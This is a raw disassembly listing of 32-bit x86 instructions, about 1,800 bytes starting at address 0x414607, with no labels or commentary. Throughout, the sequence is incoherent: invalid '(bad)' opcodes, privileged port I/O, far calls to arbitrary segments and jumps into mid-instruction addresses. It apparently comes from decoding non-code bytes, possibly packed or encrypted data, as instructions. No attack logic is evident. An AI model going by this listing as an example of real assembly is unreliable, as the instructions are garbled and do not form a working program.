  414607:	xlat   BYTE PTR ds:[ebx]
  414608:	cmp    edx,eax
  41460a:	in     eax,dx
  41460b:	pop    es
  41460c:	pop    edx
  41460d:	mul    DWORD PTR [edi+eax*1-0x75a7eab2]
  414614:	xchg   esi,eax
  414615:	shr    BYTE PTR ds:0x11ef0e6e,cl
  41461b:	ret    0x81e0
  41461e:	mov    ds:0x8281a191,al
  414623:	xor    edi,DWORD PTR [edi+edx*2-0x1]
  414627:	mov    ds:0xa15d81c8,eax
  41462c:	or     eax,0xaa1e97d9
  414631:	pushf  
  414632:	pusha  
  414633:	sbb    eax,0x5c8ba248
  414638:	add    dh,al
  41463a:	inc    edx
  41463b:	sbb    esp,DWORD PTR [edi-0x5]
  41463e:	lock in eax,0xac
  414641:	lods   eax,DWORD PTR ds:[esi]
  414642:	lods   eax,DWORD PTR ds:[esi]
  414643:	dec    esp
  414644:	cmp    ch,BYTE PTR [ebp+0x26]
  414647:	xor    al,0x20
  414649:	enter  0xfdd,0xc3
  41464d:	mov    edx,0x63299f6b
  414652:	leave  
  414653:	jge    0x4145fd
  414655:	stc    
  414656:	jge    0x414625
  414658:	mov    al,ds:0x9f3ca5f2
  41465d:	imul   ebx,edi,0xffffffc0
  414660:	cli    
  414661:	fst    DWORD PTR [ebx-0x531c9a2b]
  414667:	mov    es,WORD PTR [ecx+esi*2]
  41466a:	push   edi
  41466b:	outs   dx,DWORD PTR ds:[esi]
  41466c:	pop    edi
  41466d:	mov    edx,esp
  41466f:	cli    
  414670:	xor    eax,0xcc56d97b
  414675:	sbb    dl,BYTE PTR [edi]
  414677:	xor    eax,ebp
  414679:	xor    eax,0x841688ab
  41467e:	mov    dh,0xca
  414680:	pop    ss
  414681:	xor    DWORD PTR ds:0x278f6930,ebx
  414687:	pop    ecx
  414688:	jecxz  0x414651
  41468a:	stc    
  41468b:	cmc    
  41468c:	call   0x7ae8:0x74c8fb68
  414693:	xchg   DWORD PTR [ebx],eax
  414695:	sub    ch,BYTE PTR [edx]
  414697:	in     eax,dx
  414698:	(bad)  [esi]
  41469a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41469b:	sub    DWORD PTR [edi],eax
  41469d:	cmp    dl,BYTE PTR [esp+ecx*4]
  4146a0:	rcl    ebx,1
  4146a2:	mov    ebp,0x95ec05ad
  4146a7:	lea    edi,ds:[esi]
  4146aa:	push   edx
  4146ab:	shl    dh,0xa
  4146ae:	xchg   DWORD PTR [ebx-0x3],esi
  4146b1:	add    esi,ebp
  4146b3:	mov    ebp,0xfb351ace
  4146b8:	push   ss
  4146b9:	xor    BYTE PTR [ebx+edx*4],ch
  4146bc:	rcr    ecx,1
  4146be:	xchg   DWORD PTR [edi+0x49],ebx
  4146c1:	jge    0x414677
  4146c3:	sbb    esp,DWORD PTR cs:[edi*2+0x5dff3a90]
  4146cb:	pop    ecx
  4146cc:	jle    0x4146cf
  4146ce:	daa    
  4146cf:	aad    0xf5
  4146d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146d2:	mov    bh,0x98
  4146d4:	idiv   DWORD PTR [ecx+0x68]
  4146d7:	add    ch,BYTE PTR [eax-0x3d1fbe27]
  4146dd:	xchg   edi,eax
  4146de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146df:	loop   0x41466b
  4146e1:	lods   eax,DWORD PTR ds:[esi]
  4146e2:	fcom   DWORD PTR [edx+0x1c90b8fd]
  4146e8:	out    0xe6,al
  4146ea:	mov    edi,0x559ff827
  4146ef:	test   al,0xb8
  4146f1:	inc    edx
  4146f2:	ins    DWORD PTR es:[edi],dx
  4146f3:	dec    eax
  4146f4:	lods   eax,DWORD PTR ds:[esi]
  4146f5:	les    esi,FWORD PTR [edx]
  4146f7:	xor    DWORD PTR [ecx+0x14],ecx
  4146fa:	out    0x3e,eax
  4146fc:	imul   esp,DWORD PTR [esi],0xd05859b2
  414702:	stc    
  414703:	(bad)  
  414704:	aas    
  414705:	idiv   BYTE PTR [ebx+0x3e1c2d36]
  41470b:	dec    ebp
  41470c:	lods   eax,DWORD PTR ds:[esi]
  41470d:	adc    dl,BYTE PTR [esi+0x27e8765b]
  414713:	jb     0x414769
  414715:	je     0x414697
  414717:	out    dx,eax
  414718:	aas    
  414719:	adc    dl,0x17
  41471c:	stos   BYTE PTR es:[edi],al
  41471d:	or     DWORD PTR [eax],eax
  41471f:	aas    
  414720:	xor    eax,ebx
  414722:	test   DWORD PTR [edx+0x259f9fd1],edi
  414728:	inc    ebp
  414729:	pop    ecx
  41472a:	mov    ecx,0xd93112c6
  41472f:	dec    BYTE PTR [esp+ebx*8+0x7f012fc9]
  414736:	push   0x43
  414738:	lods   al,BYTE PTR ds:[esi]
  414739:	int3   
  41473a:	xor    DWORD PTR [edx],0x9dd93421
  414740:	and    BYTE PTR [edi+0x4b],cl
  414743:	cdq    
  414744:	shl    DWORD PTR [ecx],1
  414746:	push   ebx
  414747:	cmp    DWORD PTR [edx+0x28],edx
  41474a:	rol    DWORD PTR [ebx],1
  41474c:	xchg   ecx,eax
  41474d:	iret   
  41474e:	fwait
  41474f:	xchg   esi,eax
  414750:	nop
  414751:	adc    al,0x8
  414753:	ds daa 
  414755:	cdq    
  414756:	ins    DWORD PTR es:[edi],dx
  414757:	push   ebx
  414758:	fadd   DWORD PTR [ebx-0x5360c639]
  41475e:	aaa    
  41475f:	ins    DWORD PTR es:[edi],dx
  414760:	arpl   ax,di
  414762:	jmp    0x4146f5
  414764:	ror    BYTE PTR [esi-0x76],cl
  414767:	fwait
  414768:	and    DWORD PTR [edx+edi*1],esi
  41476b:	cmp    cl,BYTE PTR [edx+0x72]
  41476e:	push   ss
  41476f:	push   ebp
  414770:	sub    al,0x2c
  414772:	js     0x4147ba
  414774:	outs   dx,DWORD PTR ds:[esi]
  414775:	pop    esi
  414777:	push   edx
  414778:	cmp    edx,DWORD PTR [ebx]
  41477a:	(bad)  
  41477b:	sub    eax,DWORD PTR [edx+0x1e]
  41477e:	popa   
  41477f:	push   es
  414780:	xor    al,0x75
  414782:	shl    al,1
  414784:	add    ecx,edx
  414786:	jmp    0x41470c
  414788:	sub    ah,al
  41478a:	and    BYTE PTR [ecx-0x1d],al
  41478d:	xchg   edi,eax
  41478e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478f:	fnsave [esi]
  414791:	(bad)  ds:0xcbae3faa
  414797:	dec    esi
  414798:	xor    al,0x58
  41479a:	mov    ecx,0x22536e70
  41479f:	sub    DWORD PTR [esi+ebp*4-0x403d94c9],ecx
  4147a6:	xlat   BYTE PTR ds:[ebx]
  4147a7:	and    eax,0x2a3716c9
  4147ac:	inc    edx
  4147ad:	push   cs
  4147ae:	cli    
  4147af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b0:	jns    0x414743
  4147b2:	(bad)  
  4147b3:	pop    ecx
  4147b4:	es push eax
  4147b6:	add    DWORD PTR [edi],ebp
  4147b8:	call   0x878d:0x96c59703
  4147bf:	mov    ch,BYTE PTR [edi+eax*1]
  4147c2:	shr    BYTE PTR [edx],0xc8
  4147c5:	mov    dh,BYTE PTR [ecx-0x162bc9a2]
  4147cb:	add    BYTE PTR [edx],bl
  4147cd:	jecxz  0x4147f1
  4147cf:	int    0x6
  4147d1:	xor    ch,BYTE PTR [edx+0x25]
  4147d4:	push   edi
  4147d5:	mov    ch,0x40
  4147d7:	out    dx,al
  4147d8:	add    al,0xbf
  4147da:	sbb    al,0xa8
  4147dc:	(bad)  
  4147dd:	or     esp,DWORD PTR [esi-0x23193156]
  4147e3:	aas    
  4147e4:	imul   eax,DWORD PTR [edx+eax*2+0x5b],0x3e
  4147e9:	popf   
  4147ea:	and    BYTE PTR [ebp+0x12],dl
  4147ed:	pusha  
  4147ee:	jne    0x4147e7
  4147f0:	pushf  
  4147f1:	mov    fs,WORD PTR [ebp+0x16a2935d]
  4147f7:	lods   al,BYTE PTR ds:[esi]
  4147f8:	les    ebx,FWORD PTR [ecx+ebp*8]
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	mov    esi,0x7e7e09f3
  414801:	sbb    DWORD PTR [edi-0x43],ecx
  414804:	dec    ebx
  414805:	mov    ?,WORD PTR [edx]
  414807:	rcl    BYTE PTR cs:[eax+edi*2-0x13],0xdf
  41480d:	push   eax
  41480e:	shr    eax,cl
  414810:	dec    edx
  414811:	mov    eax,ds:0x9e739561
  414816:	ficom  WORD PTR [edx+ebx*1]
  414819:	stos   DWORD PTR es:[edi],eax
  41481a:	(bad)  
  41481b:	in     eax,dx
  41481c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481d:	push   esp
  41481e:	idiv   BYTE PTR [esi-0x2b1350d9]
  414824:	dec    ebx
  414825:	imul   ecx,DWORD PTR [edx+0x74],0xb6c4608b
  41482c:	popf   
  41482d:	jns    0x414809
  41482f:	mov    eax,ds:0x9adfa992
  414834:	mov    bh,0x4
  414836:	aas    
  414837:	mov    bh,0xb3
  414839:	cmp    eax,0x4902432d
  41483e:	sbb    ch,dh
  414840:	mov    edi,0xe2fff853
  414845:	sbb    ah,BYTE PTR gs:[esi]
  414848:	jmpw   0xb019
  41484c:	jno    0x414838
  41484e:	or     bl,BYTE PTR [eax-0x4e]
  414851:	pop    esp
  414852:	test   eax,0xf30f701f
  414857:	sub    DWORD PTR [edi-0x17e7bdaa],ebp
  41485d:	fist   WORD PTR [edx]
  41485f:	dec    esp
  414860:	clc    
  414861:	in     eax,0xd9
  414863:	ja     0x4148c6
  414865:	in     al,0xb
  414867:	popf   
  414868:	jbe    0x41489c
  41486a:	retf   0x9e6e
  41486d:	call   0x9759:0xda2c7cac
  414874:	mov    dl,0x78
  414876:	stos   DWORD PTR es:[edi],eax
  414877:	adc    ch,ah
  414879:	jno    0x4148be
  41487b:	lods   al,BYTE PTR ds:[esi]
  41487c:	inc    edi
  41487d:	xor    al,0x11
  41487f:	clc    
  414880:	repnz cmp eax,DWORD PTR [ebx+0x36512e98]
  414887:	cdq    
  414888:	mov    bx,0xd61
  41488c:	mov    BYTE PTR [eax+0x79bf43a6],dl
  414892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414893:	repz or DWORD PTR [ecx+0x6e05fd04],edi
  41489a:	mov    DWORD PTR fs:[ecx],0x185044cb
  4148a1:	jp     0x41485e
  4148a3:	sub    eax,0x57d9eee1
  4148a8:	jae    0x4148fa
  4148aa:	sub    esp,esi
  4148ac:	sbb    edi,DWORD PTR [edx]
  4148ae:	loope  0x4148c4
  4148b0:	jmp    0x2a68be9d
  4148b5:	aad    0x30
  4148b7:	(bad)  
  4148b8:	leave  
  4148b9:	mov    dh,0x29
  4148bb:	loop   0x414889
  4148bd:	adc    DWORD PTR [ebx-0x27],ebx
  4148c0:	mov    BYTE PTR [eax+0x72],cl
  4148c3:	in     eax,dx
  4148c4:	jge    0x414852
  4148c6:	mov    eax,ds:0xd2eb98a1
  4148cb:	mov    bl,0xdf
  4148cd:	in     al,0x8f
  4148cf:	mov    dh,0xf4
  4148d1:	and    al,0xac
  4148d3:	xor    edi,DWORD PTR [eax+0x1f]
  4148d6:	mov    ds:0x64c91c49,eax
  4148db:	fdivr  QWORD PTR [edx]
  4148dd:	dec    edi
  4148de:	push   ds
  4148df:	xchg   cl,cl
  4148e1:	lahf   
  4148e2:	shl    al,cl
  4148e4:	js     0x41489c
  4148e6:	bound  ebp,QWORD PTR [edi-0x33967926]
  4148ec:	rol    DWORD PTR [esi],0x4d
  4148ef:	mov    esp,DWORD PTR [edx]
  4148f1:	xchg   ebp,eax
  4148f2:	clc    
  4148f3:	lods   al,BYTE PTR ds:[esi]
  4148f4:	pop    esi
  4148f5:	adc    ah,BYTE PTR [esi-0x18]
  4148f8:	jmp    0x8fc793ec
  4148fd:	stos   DWORD PTR es:[edi],eax
  4148fe:	pushf  
  4148ff:	mov    ds:0x1dda3278,al
  414904:	push   ebx
  414905:	hlt    
  414906:	retf   0x17b8
  414909:	loop   0x4148ed
  41490b:	std    
  41490c:	popf   
  41490d:	xchg   esi,eax
  41490e:	daa    
  41490f:	test   BYTE PTR [edx],0x56
  414912:	jo     0x4148b0
  414914:	pop    ss
  414915:	popa   
  414916:	push   edi
  414917:	inc    ebp
  414918:	ds jnp 0x4148e8
  41491b:	hlt    
  41491c:	hlt    
  41491d:	pop    ds
  41491e:	cmc    
  41491f:	pop    ss
  414920:	leave  
  414921:	jmp    DWORD PTR [edx]
  414923:	mov    ch,BYTE PTR [ebx+eax*4-0x1a]
  414927:	lods   al,BYTE PTR ds:[esi]
  414928:	push   esp
  414929:	(bad)  
  41492a:	xor    al,0x9d
  41492c:	push   eax
  41492d:	mov    eax,cs
  41492f:	cmp    DWORD PTR [ecx+0x12],esp
  414932:	ficom  WORD PTR [esi]
  414934:	stos   DWORD PTR es:[edi],eax
  414935:	repnz inc ecx
  414938:	cmc    
  414939:	popf   
  41493a:	mov    bh,0xe5
  41493c:	inc    esi
  41493d:	je     0x414995
  41493f:	je     0x41498c
  414941:	dec    edx
  414942:	xchg   ebp,eax
  414943:	or     esp,DWORD PTR [edx-0x43]
  414946:	jge    0x41499d
  414948:	(bad)  
  414949:	jns    0x4149c8
  41494b:	push   edx
  41494c:	daa    
  41494d:	lea    ecx,[edi-0x58d156bc]
  414953:	mov    edi,0x4f024b52
  414958:	xchg   esp,eax
  414959:	out    0x2a,eax
  41495b:	dec    ebx
  41495c:	xor    eax,0x82bed5ef
  414961:	adc    al,al
  414963:	test   al,0x33
  414965:	ror    ah,cl
  414967:	iret   
  414968:	loop   0x414917
  41496a:	sti    
  41496b:	push   esi
  41496c:	je     0x41493a
  41496e:	js     0x4149ab
  414970:	and    eax,0x10d548c2
  414975:	mov    bl,0x99
  414977:	cmp    esi,DWORD PTR [ebx]
  414979:	fimul  DWORD PTR [ebx+0x17]
  41497c:	je     0x414934
  41497e:	inc    ebx
  41497f:	pushf  
  414980:	into   
  414981:	jg     0x4149e6
  414983:	dec    eax
  414984:	sbb    esi,edx
  414986:	arpl   WORD PTR [ebp+0x16],dx
  414989:	adc    DWORD PTR [ebx+0x7f2416b6],edx
  41498f:	jnp    0x414928
  414991:	jbe    0x414920
  414993:	and    al,BYTE PTR [ecx+esi*8-0x69]
  414997:	test   DWORD PTR [esi+0x5aa9f5cc],edx
  41499d:	es pop ebx
  41499f:	and    al,0xef
  4149a1:	dec    ecx
  4149a2:	xor    ebp,0xb5c7c789
  4149a8:	jnp    0x414999
  4149aa:	jns    0x414a11
  4149ac:	ins    BYTE PTR es:[edi],dx
  4149ad:	dec    ebp
  4149ae:	iret   
  4149af:	ds aad 0x73
  4149b2:	ds inc ebx
  4149b4:	repz sub esi,DWORD PTR [ebx+0x190db850]
  4149bb:	pop    ecx
  4149bc:	and    BYTE PTR [eax+eiz*8+0x55],ah
  4149c0:	mov    al,ds:0x9d0db9
  4149c5:	push   esp
  4149c6:	xchg   ebp,eax
  4149c7:	test   al,0x60
  4149c9:	test   BYTE PTR [eax],dh
  4149cb:	inc    edi
  4149cc:	ds xor al,0x49
  4149cf:	mov    bl,0x40
  4149d1:	pop    ebx
  4149d2:	jmp    0x7f4a2dbc
  4149d7:	mov    esi,0xd2dc5a6e
  4149dc:	pop    edx
  4149dd:	das    
  4149de:	mul    BYTE PTR ds:0xc9b09233
  4149e4:	add    ecx,DWORD PTR [edx+0xe]
  4149e7:	jo     0x4149b9
  4149e9:	outs   dx,BYTE PTR ds:[esi]
  4149ea:	dec    edi
  4149eb:	rcr    BYTE PTR [ebp+ebx*1-0x58fe92ea],1
  4149f2:	xor    BYTE PTR [edx-0x5ca5dbb1],ah
  4149f8:	dec    esi
  4149f9:	cmp    DWORD PTR [edx],ebp
  4149fb:	test   DWORD PTR [ebx+0x10],ecx
  4149fe:	pop    esi
  4149ff:	pop    esp
  414a00:	sahf   
  414a01:	shr    eax,cl
  414a03:	mov    ch,0x10
  414a05:	jge    0x414a4f
  414a07:	push   edi
  414a08:	pop    ds
  414a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0a:	mov    ecx,0xd018ecf5
  414a0f:	leave  
  414a10:	or     al,0x81
  414a12:	(bad)  
  414a13:	es (bad) 
  414a18:	rcr    BYTE PTR [ebp-0x37f20545],0xb6
  414a1f:	pop    es
  414a20:	and    DWORD PTR ds:0xe1c03624,edi
  414a26:	xor    al,0x67
  414a28:	xchg   esi,eax
  414a29:	loopne 0x414a4f
  414a2b:	mov    eax,ds:0x8b6d5ec0
  414a30:	mov    ch,0x43
  414a32:	cmp    BYTE PTR [edi-0x716a49a3],dl
  414a38:	rol    BYTE PTR [eax+ebx*4+0x1c],cl
  414a3c:	sbb    DWORD PTR [edx],0xfffffff7
  414a3f:	clc    
  414a40:	stos   DWORD PTR es:[edi],eax
  414a41:	mov    ds:0x6aca788c,al
  414a46:	and    DWORD PTR [esi-0x16f6f7e0],0x34df0cb7
  414a50:	ret    0xa186
  414a53:	arpl   WORD PTR [eax],cx
  414a55:	in     eax,dx
  414a56:	or     ecx,edi
  414a58:	fs iret 
  414a5a:	jl     0x414a80
  414a5c:	fs dec ebx
  414a5e:	retf   
  414a5f:	push   ecx
  414a60:	js     0x414a8c
  414a62:	in     eax,dx
  414a63:	test   BYTE PTR [eax],ah
  414a65:	or     eax,0xbbaee05
  414a6a:	mov    edi,0x1ea97459
  414a6f:	adc    DWORD PTR [edi+0x31b08bcc],ebx
  414a75:	push   edi
  414a76:	xchg   edx,eax
  414a77:	ds fadd st(2),st
  414a7a:	xchg   ecx,eax
  414a7b:	adc    cl,BYTE PTR [edi]
  414a7d:	cdq    
  414a7e:	out    dx,al
  414a7f:	in     al,dx
  414a80:	cmp    eax,0x2f339247
  414a85:	xor    eax,0x3c32aa5b
  414a8a:	jne    0x414ab4
  414a8c:	imul   esi,DWORD PTR [edi+0xd],0xffffffb0
  414a90:	test   BYTE PTR [edx],bl
  414a92:	adc    eax,0x8829db9d
  414a97:	add    esp,DWORD PTR [ecx-0x65]
  414a9a:	int    0xdd
  414a9c:	bound  esp,QWORD PTR [edx-0x70]
  414a9f:	pop    DWORD PTR [esi+0x51]
  414aa2:	xor    edi,edx
  414aa4:	loop   0x414aeb
  414aa6:	inc    edi
  414aa7:	jae    0x414aee
  414aa9:	pop    ebp
  414aaa:	loop   0x414a57
  414aac:	jmp    0x5d742155
  414ab1:	imul   esp,eax,0xffffffe5
  414ab4:	cs push eax
  414ab6:	add    edx,DWORD PTR [ebp-0x35]
  414ab9:	sti    
  414aba:	mov    ecx,0xf61a0118
  414abf:	xor    al,BYTE PTR [ebp+0x4c]
  414ac2:	sub    dh,dl
  414ac4:	ret    0xa6fd
  414ac7:	jle    0x414a85
  414ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aca:	retf   0xb6bc
  414acd:	sbb    edx,DWORD PTR [edi+0x36adcf83]
  414ad3:	mov    esi,0x37f86aeb
  414ad8:	mov    dh,0x7e
  414ada:	in     eax,0x84
  414adc:	mov    ch,0x78
  414ade:	and    cl,BYTE PTR [edi-0x5b]
  414ae1:	xor    DWORD PTR [edx+edi*2+0x4f6f0553],0x1b
  414ae9:	(bad)  
  414aea:	sub    edi,esi
  414aec:	push   ss
  414aed:	comiss xmm3,DWORD PTR [ebx]
  414af0:	enter  0x79e4,0x41
  414af4:	pushf  
  414af5:	addr16 loope 0x414ac7
  414af8:	xor    DWORD PTR [ebp+0x7a20a85c],esi
  414afe:	loopne 0x414b24
  414b00:	inc    esp
  414b01:	rol    esp,1
  414b03:	jmp    0x414b06
  414b05:	outs   dx,DWORD PTR ds:[esi]
  414b06:	adc    ebx,DWORD PTR [edi-0x5de2e471]
  414b0c:	xor    dl,cl
  414b0e:	pushw  0xffc3
  414b11:	aad    0xd0
  414b13:	test   bl,dl
  414b15:	jno    0x414b71
  414b17:	inc    esp
  414b18:	ror    DWORD PTR [ecx+0xbba36fa],1
  414b1e:	pop    esi
  414b1f:	retf   
  414b20:	sahf   
  414b21:	fimul  DWORD PTR [eax+edx*4-0x81de676]
  414b28:	js     0x414b80
  414b2a:	ja     0x414acc
  414b2c:	iret   
  414b2d:	dec    esp
  414b2e:	xchg   edx,eax
  414b2f:	jbe    0x414b3a
  414b31:	leave  
  414b32:	push   ds
  414b33:	jb     0x414b7c
  414b35:	pop    ss
  414b36:	(bad)  
  414b37:	das    
  414b38:	imul   ebp,DWORD PTR [edi+0x6d],0x25
  414b3c:	sbb    edi,DWORD PTR [ecx+0xfc11570]
  414b42:	or     dh,0x2d
  414b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b46:	test   al,0x98
  414b48:	push   esi
  414b49:	sahf   
  414b4a:	sub    ebx,DWORD PTR [edx-0x7b]
  414b4d:	sub    eax,0x60661c1c
  414b52:	cwde   
  414b53:	fidivr WORD PTR [ebp-0x7c042e11]
  414b59:	loope  0x414ba8
  414b5b:	in     al,0xbb
  414b5d:	aas    
  414b5e:	(bad)  
  414b5f:	sub    BYTE PTR [eax],ah
  414b61:	dec    ecx
  414b62:	or     DWORD PTR [ebp+0x3e2b153f],0xffffffb1
  414b69:	mov    BYTE PTR [edx+0x516eee40],dh
  414b6f:	pop    edi
  414b70:	sbb    ah,dh
  414b72:	xchg   ecx,eax
  414b73:	lea    eax,[ebx-0x409aed46]
  414b79:	in     al,dx
  414b7a:	dec    ebp
  414b7b:	(bad)  
  414b7d:	jle    0x414beb
  414b7f:	dec    ebx
  414b80:	sar    BYTE PTR [esi-0x32],1
  414b83:	adc    ebp,DWORD PTR [edi+ebx*8]
  414b86:	ins    BYTE PTR es:[edi],dx
  414b87:	inc    esp
  414b88:	cmp    BYTE PTR [edi+edi*4+0x5e282c8b],al
  414b8f:	adc    al,0xc9
  414b91:	out    0xd2,al
  414b93:	cmp    eax,ebp
  414b95:	call   DWORD PTR [edx]
  414b97:	cmp    edx,DWORD PTR [edx]
  414b99:	jle    0x414b5d
  414b9b:	mov    WORD PTR [ecx+0x3f],ss
  414b9e:	jl     0x414bc1
  414ba0:	fsubr  DWORD PTR [ebx+0x6c]
  414ba3:	push   es
  414ba4:	test   al,0xa0
  414ba6:	test   BYTE PTR ds:0xbcd165af,al
  414bac:	repz dec edi
  414bae:	in     eax,dx
  414baf:	adc    eax,0x12d88e06
  414bb4:	inc    ecx
  414bb5:	in     eax,0x23
  414bb7:	shr    ecx,1
  414bb9:	inc    edx
  414bba:	lods   eax,DWORD PTR ds:[esi]
  414bbb:	pop    es
  414bbc:	adc    BYTE PTR [edi],ah
  414bbe:	lea    ecx,[esi+0x54]
  414bc1:	mov    cl,ah
  414bc3:	jg     0x414bd9
  414bc5:	out    0x77,al
  414bc7:	adc    BYTE PTR [ecx-0x2e],al
  414bca:	xchg   ebx,eax
  414bcb:	xchg   esp,eax
  414bcc:	test   edi,ecx
  414bce:	cmp    al,0xd3
  414bd0:	clc    
  414bd1:	mov    bl,0xaa
  414bd3:	jp     0x414c48
  414bd5:	mov    al,0x3b
  414bd7:	jg     0x414b64
  414bd9:	pop    ebp
  414bda:	xchg   DWORD PTR [esi],esp
  414bdc:	jge    0x414bc0
  414bde:	loop   0x414c23
  414be0:	cmp    eax,0xd3f7ec4e
  414be5:	stos   BYTE PTR es:[edi],al
  414be6:	push   ebp
  414be7:	mov    ecx,0x6ecf690f
  414bec:	jno    0x414c34
  414bee:	daa    
  414bef:	jg     0x414c44
  414bf1:	inc    esp
  414bf2:	mov    al,0x82
  414bf4:	shl    DWORD PTR [ebx],0x8e
  414bf7:	stc    
  414bf8:	jg     0x414bcf
  414bfa:	xchg   ecx,eax
  414bfb:	aas    
  414bfc:	cmp    DWORD PTR [ebp+0x1],ebp
  414bff:	(bad)  
  414c00:	mov    ebp,0x3657f7d9
  414c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c06:	shr    BYTE PTR [eax],0x38
  414c09:	stos   BYTE PTR es:[edi],al
  414c0a:	jns    0x414c19
  414c0c:	shr    esi,1
  414c0e:	pushf  
  414c0f:	sub    ecx,DWORD PTR [esi+0x72]
  414c12:	push   ebx
  414c13:	push   eax
  414c14:	dec    edi
  414c15:	bnd je 0x414c03
  414c18:	push   0x66
  414c1a:	jne    0x414c76
  414c1c:	mov    fs,WORD PTR [eax+0x2accedf4]
  414c22:	jmp    0x414c92
  414c24:	sti    
  414c25:	mov    bh,0x9c
  414c27:	inc    eax
  414c28:	xchg   ebp,eax
  414c29:	adc    ebx,DWORD PTR [ebx-0x51]
  414c2c:	in     al,0x69
  414c2e:	or     eax,0x77fee792
  414c33:	mov    esi,0xee647a80
  414c38:	aad    0x80
  414c3a:	dec    esp
  414c3b:	mov    esp,0xbad35167
  414c40:	arpl   WORD PTR [esi+0x32],cx
  414c43:	icebp  
  414c44:	dec    edi
  414c45:	or     al,0x4a
  414c47:	jecxz  0x414c5d
  414c49:	imul   esp,DWORD PTR [edx+0x7f],0x2
  414c4d:	sub    eax,0xd93c2b76
  414c52:	shl    BYTE PTR [eax-0x69457ec8],cl
  414c58:	cwde   
  414c59:	push   ebx
  414c5a:	icebp  
  414c5b:	push   ebp
  414c5c:	xchg   DWORD PTR [edx+0x3d],ecx
  414c5f:	pusha  
  414c60:	mov    ds:0xa98c8ea8,al
  414c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c66:	push   ds
  414c67:	imul   eax,edi,0x59
  414c6a:	cmp    DWORD PTR [ecx+0x7abc11e1],ebx
  414c70:	ds push es
  414c72:	inc    esp
  414c73:	sbb    esi,DWORD PTR [ebx]
  414c75:	daa    
  414c76:	inc    eax
  414c77:	xor    bl,BYTE PTR [edx]
  414c79:	cmp    BYTE PTR [edi-0x2e361c84],ah
  414c7f:	sub    DWORD PTR [ebp-0x66],0x3b
  414c83:	mov    ebp,0x7f2e8aa2
  414c88:	enter  0xd3e,0x61
  414c8c:	pop    es
  414c8d:	mov    ebp,0xeb0c17de
  414c92:	and    DWORD PTR [ecx-0x139a3526],0xffffffcc
  414c99:	repnz mov ss,WORD PTR [ebx+0x328e5d44]
  414ca0:	xor    DWORD PTR [esi+0x4c],ecx
  414ca3:	adc    esi,DWORD PTR [ebp-0x298a18bc]
  414ca9:	sub    eax,0xb8dd4998
  414cae:	dec    ebx
  414caf:	jne    0x414c6d
  414cb1:	dec    ebp
  414cb2:	xchg   ecx,eax
  414cb3:	xchg   ebp,eax
  414cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb5:	stc    
  414cb6:	dec    ebp
  414cb7:	adc    BYTE PTR [esi-0x50],dh
  414cba:	rcl    BYTE PTR [ebx+0x59],0xa1
  414cbe:	test   BYTE PTR [eax-0x1c28d9a8],al
  414cc4:	retf   0x33d6
  414cc7:	adc    al,0xef
  414cc9:	cmp    ch,BYTE PTR [edi]
  414ccb:	mov    bl,0x3d
  414ccd:	icebp  
  414cce:	cs jle 0x414d35
  414cd1:	push   0x41e7ee28
  414cd6:	or     al,dh
  414cd8:	sbb    ch,BYTE PTR [esi+eax*1]
  414cdb:	xchg   edx,eax
  414cdc:	pop    es
  414cdd:	daa    
  414cde:	jns    0x414c7b
  414ce0:	mov    ds:0xefabc553,eax
  414ce5:	jmp    0x414cfb
  414ce7:	jmp    0xca6a03e1
  414cec:	(bad)  
  414ced:	and    bh,BYTE PTR [ebx]
  414cef:	pop    ecx
  414cf0:	dec    esp
  414cf1:	or     DWORD PTR [edx-0x4a99237a],esi
  414cf7:	add    eax,0xe51387c2
  414cfc:	ja     0x414d58
  414cfe:	dec    ecx
  414cff:	mov    esi,0x2e6b8244
  414d04:	pop    eax
  414d05:	test   al,0x27
  414d07:	mov    BYTE PTR [esi+0x7a74e628],dl
  414d0d:	sub    BYTE PTR [edi+0x64e1bb01],bh
  414d13:	(bad)  
  414d14:	cmp    al,0xdf
  414d16:	and    esp,DWORD PTR [edi]
  414d18:	and    bl,BYTE PTR [eax-0x4e]
  414d1b:	jp     0x414d01
  414d1d:	aas    
  414d1e:	jbe    0x414d33
  414d20:	popf   
  414d21:	sbb    ch,bl
  414d23:	cmp    dl,BYTE PTR [eax+0x592b5240]
  414d29:	ja     0x414cf6
  414d2b:	add    DWORD PTR [edi],edi
  414d2d:	jbe    0x414cd6
  414d2f:	add    edx,ebx
  414d31:	in     eax,0x0
  414d33:	inc    esi
  414d34:	scas   eax,DWORD PTR es:[edi]
  414d35:	outs   dx,DWORD PTR ds:[esi]
  414d36:	push   ecx
  414d37:	dec    edi
  414d38:	bound  edi,QWORD PTR [edx+0x65747428]
  414d3e:	mov    ch,0xee
  414d40:	popf   
  414d41:	loopne 0x414d94
  414d43:	mov    esp,0x9d9a4072
  414d48:	fbstp  TBYTE PTR [esp+edx*1+0x76]
  414d4c:	mov    ebx,0xf39cdf7f
  414d51:	repz add BYTE PTR [eax],cl
  414d54:	(bad)  
  414d55:	mov    ebx,0x361d14b0
  414d5a:	ds cmp eax,ebx
  414d5d:	xchg   ecx,eax
  414d5e:	jmp    0x5877:0xcf42dc14
  414d65:	adc    al,0x42
  414d67:	jo     0x414daa
  414d69:	mov    al,dh
  414d6b:	sbb    BYTE PTR ds:0x88dd4031,bh
  414d71:	dec    eax
  414d72:	push   esi
  414d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d74:	dec    ebp
  414d75:	mov    ah,0x65
  414d77:	dec    edx
  414d78:	in     eax,dx
  414d79:	mov    edi,0x25a9ef7c
  414d7e:	sbb    eax,0x5bfed38c
  414d83:	enter  0xf7e,0x22
  414d87:	push   edi
  414d88:	shl    DWORD PTR [edi+0xdb5ce65],cl
  414d8e:	cmp    eax,0xbb7b2e90
  414d93:	fwait
  414d94:	jp     0x414db6
